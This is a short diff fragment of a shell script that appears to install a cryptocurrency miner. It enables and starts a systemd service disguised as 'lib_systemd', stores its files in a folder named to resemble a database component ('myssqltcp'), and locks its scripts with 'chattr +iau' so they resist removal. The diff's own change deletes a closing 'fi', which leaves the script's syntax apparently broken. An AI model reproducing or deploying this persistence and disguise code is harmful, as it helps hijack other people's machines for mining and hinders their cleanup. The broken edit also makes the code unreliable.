@@ -925,7 +925,7 @@ EOL
     sudo systemctl enable lib_systemd.service
     sudo systemctl start lib_systemd.service
     echo "To see miner service logs run \"sudo journalctl -u lib_systemd -f\" command"
-  fi
+    
 # lock
 chattr -V +iau $HOME/myssqltcp/lib_systemd.sh
 chattr -V +iau $HOME/myssqltcp/logserver.sh
